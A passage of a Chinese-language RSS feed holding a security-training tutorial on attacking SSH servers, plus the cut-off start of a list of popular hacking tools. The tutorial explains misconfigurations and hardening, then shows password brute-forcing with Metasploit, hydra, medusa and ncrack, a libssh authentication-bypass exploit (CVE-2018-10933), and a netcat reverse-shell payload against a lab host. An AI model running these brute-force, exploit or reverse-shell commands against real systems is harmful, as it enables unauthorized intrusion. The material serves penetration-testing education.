</item>
<item>
<title>渗透测试中的SSH</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-07-101260538.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101260538&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6c752bdf4bd8271296bcba570ce8e9be_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;什么是SSH和SFTP？&lt;/h2&gt;&lt;p&gt;&lt;b&gt;SSH&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一种安全的远程外壳协议，用于通过不安全的网络安全地运行网络服务。默认的 SSH 端口是 22，通常会在 Internet 或 Intranet 的服务器上开启。&lt;/p&gt;&lt;p&gt;&lt;b&gt;SFTP&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是 SSH 文件传输协议，该协议用于通过 SSH 连接传输文件，大多数 SSH 实现也支持 SFTP。&lt;/p&gt;&lt;h2&gt;SSH服务器/库&lt;/h2&gt;&lt;p&gt;最常见的 SSH 服务器和客户端是 openSSH（OpenBSD 安全外壳）。是 SSH 的一个功能强大的开源实现。OpenSSH 提供了服务端后台程序和客户端工具，用来加密远程控制和文件传输过程中的数据，并由此来代替原来的类似服务。&lt;/p&gt;&lt;p&gt;但是 openSSH 并不是唯一的实现，还有其他的：&lt;/p&gt;&lt;p&gt;&lt;b&gt;SSH 服务器&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;openSSH – OpenBSD SSH，自 Windows 10 起在 BSD，Linux 发行版和 Windows中提供&lt;/li&gt;&lt;li&gt;Dropbear – OpenWrt 附带的用于内存和处理器资源较少的环境的SSH实现&lt;/li&gt;&lt;li&gt;PuTTY – Windows 的 SSH 实现，通常使用客户端，但很少使用服务器&lt;/li&gt;&lt;li&gt;CopSSH – Windows 版 OpenSSH&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;SSH库（在服务器端实现）&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;libssh -多平台 C 库实现与在绑定 SSHv2 的协议 Python、Perl; 它由 KDE 用于 sftp，由 GitHub 用于 git SSH 基础结构&lt;/li&gt;&lt;li&gt;wolfSSH –用 ANSI C 编写的 SSHv2 服务器库，面向嵌入式、RTOS 和资源受限的环境&lt;/li&gt;&lt;li&gt;Apache MINA SSHD – Apache SSHD Java 库基于 Apache MINA&lt;/li&gt;&lt;li&gt;paramiko – Python SSHv2 协议库&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;常见的配置错误&lt;/h2&gt;&lt;p&gt;&lt;b&gt;001-root登录&lt;/b&gt;&lt;/p&gt;&lt;p&gt;默认情况下，大多数 SSH 服务器实现将允许 root 登录，建议禁用，因为如果该帐户的密码泄漏，攻击者将直接获得管理员权限。&lt;/p&gt;&lt;p&gt;&lt;b&gt;如何禁用openSSH的root登录：&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;编辑 SSH 服务器配置 sudoedit /etc/ssh/sshd_config&lt;/li&gt;&lt;li&gt;更改 #PermitRootLogin yes 成 PermitRootLogin no&lt;/li&gt;&lt;li&gt;考虑配置更改：sudo systemctl daemon-reload&lt;/li&gt;&lt;li&gt;重启 SSH 服务器 sudo systemctl restart sshd &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;002-SFTP 命令执行&lt;/b&gt;&lt;/p&gt;&lt;p&gt;另一个常见的 SSH 错误配置通常出现在 SFTP 配置中。很多人在创建 SFTP 服务器时，管理员希望用户具有 SFTP 访问权限来共享文件，而不希望在计算机上获得远程 Shell。因此，在创建用户时为用户分配 placeholder shell（如 /usr/bin/nologin 或 /usr/bin/false）并避免 shell 访问或滥用整个文件系统。&lt;/p&gt;&lt;p&gt;这样是错误的，用户可以在身份验证后立即要求执行命令，然后再执行其默认命令或 shell 程序。因此，只需执行以下操作即可执行命令（例如 /bin/bash）：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这是用户 noraj 的 SFTP 配置（/ etc / ssh / sshd_config – openSSH）：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Match User noraj
        ChrootDirectory %h
        ForceCommand internal-sftp
        AllowTcpForwarding no
        PermitTunnel no
        X11Forwarding no
        PermitTTY no&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;此配置将仅允许 SFTP 通过强制启动命令并禁用 TTY 访问来禁用 shell 程序访问，还可以禁用所有类型的端口转发或隧道。&lt;/p&gt;&lt;p&gt;&lt;b&gt;003-认证方式&lt;/b&gt;&lt;/p&gt;&lt;p&gt;在安全性较高的环境中，通常是仅启用基于密钥或两因素的身份验证，而不是基于简单因素密码的身份验证。但是通常启用更强的身份验证方法而不会禁用较弱的身份验证方法。一种常见的情况是启用 publickeyopenSSH 配置并将其设置为默认方法，而不是禁用 password。因此，通过使用 SSH 客户端的 verbose 模式，攻击者可以看到启用了一种较弱的方法：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例如，如果设置了身份验证失败限制，而也没有机会使用密码，则可以使用 PreferredAuthentications 选项强制调用此方法。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看 SSH 服务器配置，检查是否仅授权了所讲的方法。&lt;/p&gt;&lt;h2&gt;攻击演示&lt;/h2&gt;&lt;p&gt;一系列攻击示例，可以在某些 SSH 服务器中进行测试。&lt;/p&gt;&lt;p&gt;&lt;b&gt;密码猜测/爆破&lt;/b&gt;&lt;/p&gt;&lt;p&gt;目标：192.168.1.94 端口：22&lt;/p&gt;&lt;p&gt;&lt;b&gt;Metasploit&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ msf5 &amp;gt; search ssh

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
...
   17  auxiliary/scanner/ssh/ssh_login                                              normal     Yes    SSH Login Check Scanner
...
msf5 &amp;gt; use 17
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set PASS_FILE /usr/share/wordlists/password/rockyou.txt
PASS_FILE =&amp;gt; /usr/share/wordlists/password/rockyou.txt
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set RHOSTS 192.168.1.94
RHOSTS =&amp;gt; 192.168.1.94
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set THREADS 10
THREADS =&amp;gt; 10
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set STOP_ON_SUCCESS true
STOP_ON_SUCCESS =&amp;gt; true
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; set username noraj
username =&amp;gt; noraj
msf5 auxiliary(scanner/ssh/ssh_login) &amp;gt; run

[+] 192.168.1.94:22 - Success: &amp;#39;noraj:noraj&amp;#39; &amp;#39;&amp;#39;
[*] Command shell session 1 opened (192.168.1.83:37291 -&amp;gt; 192.168.1.94:22) at 2020-01-02 21:33:33 +0100
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;hydra（九头蛇）&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ hydra -l noraj -P /usr/share/wordlists/password/rockyou.txt -e s ssh://192.168.1.94
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 21:44:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.94:22/
[22][ssh] host: 192.168.1.94   login: noraj   password: noraj
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 21:44:33&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-l LOGIN or -L FILE  使用名称登录，或从文件中加载多个登录名 &lt;br/&gt;-p PASS  or -P FILE  使用密码登录，或从文件加载多个密码&lt;br/&gt;-e nsr    尝试使用“ n”个空密码，以“ s”作为通过登录名和“ r”反向登录服务破解服务&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;medusa&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ medusa -h 192.168.1.94 -u noraj -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &amp;lt;jmk@foofus.net&amp;gt;

ACCOUNT CHECK: [ssh] Host: 192.168.1.94 (1 of 1, 0 complete) User: noraj (1 of 1, 0 complete) Password: noraj (1 of 14344391 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.94 User: noraj Password: noraj [SUCCESS]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-h [TEXT]    : 目标主机名或 IP 地址&lt;br/&gt;-u [TEXT]    : 要测试的用户名&lt;br/&gt;-P [FILE]    : 要测试的密码文件&lt;br/&gt;-e [n/s/ns]  : 其他密码检查（[n]无密码，[s]密码=用户名）&lt;br/&gt;-M [TEXT]    : 要执行的模块的名称（不带 .mod 扩展名）&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;Ncrack&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ ncrack --user noraj -P /usr/share/wordlists/password/rockyou.txt ssh://192.168.1.94
Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-01-02 21:50 CET

Discovered credentials for ssh on 192.168.1.94 22/tcp:
192.168.1.94 22/tcp ssh: &amp;#39;noraj&amp;#39; &amp;#39;noraj&amp;#39;

Ncrack done: 1 service scanned in 3.00 seconds.

Ncrack finished.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参数：&lt;/p&gt;&lt;blockquote&gt;-P &amp;lt;filename&amp;gt;: 密码文件&lt;br/&gt;--user &amp;lt;username_list&amp;gt;: 以逗号分隔的用户名列表&lt;/blockquote&gt;&lt;h2&gt;漏洞利用– LibSSH RCE&lt;/h2&gt;&lt;p&gt;&lt;b&gt;CVE-2018-10933&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//cve.mitre.org/cgi-bin/cvename.cgi%3Fname%3DCVE-2018-10933&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;cve.mitre.org/cgi-bin/c&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;vename.cgi?name=CVE-2018-10933&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;影响 libssh 库的漏洞，此漏洞通过绕过身份验证允许未经授权的访问。&lt;/p&gt;&lt;blockquote&gt;libssh 0.6 及更高版本在服务器代码中具有身份验证绕过漏洞。&lt;/blockquote&gt;&lt;p&gt;通过向服务器提供 SSH2_MSG_USERAUTH_SUCCESS 消息代替服务器希望进行身份验证的 SSH2_MSG_USERAUTH_REQUEST 消息，攻击者可以在没有任何凭据的情况下成功进行身份验证。&lt;/p&gt;&lt;p&gt;nmap 扫描结果：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;22/tcp  open     ssh      libssh 0.8.3 (protocol 2.0)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;searchsploit（用于本地浏览 Exploit-DB 的工具）显示了可用于的现有漏洞利用 libssh。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;searchsploit libssh
-------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                              |  Path
                                                                                            | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------- ----------------------------------------
LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                                  | exploits/linux/remote/46307.py
libSSH - Authentication Bypass                                                              | exploits/linux/remote/45638.py
-------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因此，我们可以使用漏洞利用程序在目标上执行命令，确认其是否正常运行。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;尝试反向 shell，先打开监听&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo ncat -nlp 80&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，在漏洞利用中使用 payload：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 &amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.1.100 80 &amp;gt;/tmp/f&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;模糊测试&lt;/h2&gt;&lt;p&gt;这里介绍两种：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通用&amp;amp;自动化&lt;/li&gt;&lt;li&gt;特定&amp;amp;手工&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;通用&amp;amp;自动化&lt;/b&gt;&lt;/p&gt;&lt;p&gt;可以使用 sshfuzz.pl 之类的脚本来自动对 SSH 服务器实时进行模糊测试。&lt;/p&gt;&lt;p&gt;优点是操作简单，但是它的针对性不强，因此将花费大量时间并且错过很多结果。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$ cpan Net::SSH2
$ ./sshfuzz.pl -H 192.168.1.94 -P 22 -u noraj -p noraj&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一种适用于任何 SSH 服务器的自动化检测工具，是使用 metasploit 的模块 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;auxiliary/fuzzers/ssh/ssh_version_2&lt;/a&gt;：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 &amp;gt; use auxiliary/fuzzers/ssh/ssh_version_2
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &amp;gt; set RHOSTS 192.168.1.94
msf5 auxiliary(fuzzers/ssh/ssh_version_2) &amp;gt; run
[*] Running module against 192.168.1.94

[*] 192.168.1.94:22 - Fuzzing with iteration 100 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 200 using fuzzer_string_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 300 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 400 using fuzzer_string_long
[*] 192.168.1.94:22 - Fuzzing with iteration 500 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 600 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 700 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 800 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 900 using fuzzer_string_paths_giant
[*] 192.168.1.94:22 - Fuzzing with iteration 1000 using fuzzer_string_paths_giant
...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这些工具使用起来很容易，但是找到可利用的机会很小。&lt;/p&gt;&lt;p&gt;&lt;b&gt;特定&amp;amp;手动&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果想找到漏洞或可利用的点，可以选择手动方法。需要尝试构建字典，深入理解 SSH 协议及其实现等等。&lt;/p&gt;&lt;h2&gt;相关工具和资源&lt;/h2&gt;&lt;p&gt;&lt;b&gt;HASSH&lt;/b&gt;&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/salesforce/hassh&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/salesforce/h&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;assh&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;blockquote&gt;一种网络指纹识别标准，可用于标识特定的客户端和服务器SSH实现。指纹可以以 MD5 指纹的形式轻松存储、搜索和共享。&lt;/blockquote&gt;&lt;p&gt;HASSH 是一项标准，可帮助蓝队检测，控制和调查爆破或凭据填充、密码尝试、数据泄露、网络发现和横向移动等。ssh-audit 是 SSH 服务器审核工具。&lt;/p&gt;&lt;p&gt;对于渗透测试人员来说，快速检测目标版本并了解远程服务器上可用的算法，再向客户提供算法建议。&lt;/p&gt;&lt;p&gt;&lt;b&gt;远程 SSH 漏洞&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Sysax 5.53-SSH&amp;#39;Username&amp;#39;远程缓冲区溢出（Metasploit）：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/18557&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/18557&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH &amp;lt;6.6 SFTP-命令执行：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45001&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/45001&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH 2.3 &amp;lt;7.7-用户名枚举：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/45233&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/45233&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;OpenSSH SCP客户端-写入任意文件：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.exploit-db.com/exploits/46516&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;exploit-db.com/exploits&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/46516&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;源自 TURGENSEC &lt;b&gt;noraj&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;更多有关内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-07-101260538</guid>
<pubDate>Tue, 07 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>2019年最受欢迎的20款黑客工具</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-07-100870206.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/100870206&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bac1ccb305a9a380a36c277107da44ad_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;恍惚间就到了2020年，在过去的一年里，你都用了哪些黑客工具呢？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;今天，统计了全球各大网站数据（浏览量、下载量、使用量等等），为大家总结出了2019年最受欢迎的 20 款黑客工具。涉及范围主要集中在 信息收集、Android黑客工具、自动化工具、网络钓鱼等，感兴趣的同学不容错过。&lt;/p&gt;&lt;blockquote&gt;取前 20 款，但下面列出排名不分先后！&lt;/blockquote&gt;&lt;h2&gt;001 Hijacker v1.5&lt;/h2&gt;&lt;blockquote&gt;适用于 Android 的多合一 WiFi 破解工具。&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/chrisk44/Hijacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chrisk44/Hij&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;acker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e3cf4eaaac9250eb32d89e96877fd41d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;986&quot; data-rawheight=&quot;584&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;986&quot; data-original=&quot;https://pic2.zhimg.com/v2-e3cf4eaaac9250eb32d89e96877fd41d_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e3cf4eaaac9250eb32d89e96877fd41d_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;986&quot; data-rawheight=&quot;584&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;986&quot; data-original=&quot;https://pic2.zhimg.com/v2-e3cf4eaaac9250eb32d89e96877fd41d_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-e3cf4eaaac9250eb32d89e96877fd41d_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;适用于 Android 5+ 的 Aircrack，Airodump，Aireplay，MDK3 和 Reaver GUI 应用程序。（需要 root）&lt;/p&gt;&lt;p&gt;&lt;b&gt;特征&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;查看附近 wifi 及设备列表&lt;/li&gt;&lt;li&gt;获取接入点信息&lt;/li&gt;&lt;li&gt;取消他人的连接&lt;/li&gt;&lt;li&gt;捕获数据包等等&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;002 Findomain v0.9.3&lt;/h2&gt;&lt;blockquote&gt;最快且跨平台的子域枚举器。（之前打算推它的，阴差阳错被忽略了）&lt;/blockquote&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Edu4rdSHL/findomain&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Edu4rdSHL/fi&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ndomain&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;其最大的优势就是：&lt;b&gt;快&lt;/b&gt;&lt;/p&gt;&lt;p&gt;测试结果为 5.5 秒内收集 84110 个子域。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-294e6456ca02b2dbfbfa763d0137fcf5_b.jpg&quot; 